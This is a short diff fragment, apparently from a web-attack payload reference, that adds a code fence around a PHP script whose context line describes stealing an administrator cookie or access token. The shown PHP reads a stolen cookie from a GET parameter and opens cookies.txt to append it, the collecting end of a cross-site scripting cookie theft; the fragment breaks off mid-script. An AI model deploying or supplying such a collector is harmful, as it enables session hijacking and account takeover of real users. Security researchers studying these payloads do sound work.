@@ -117,6 +117,7 @@ Obtains the administrator cookie or sensitive access token, the following payloa
 
 Write the collected data into a file.
 
+```php
 <?php
 $cookie = $_GET['c'];
 $fp = fopen('cookies.txt', 'a+');
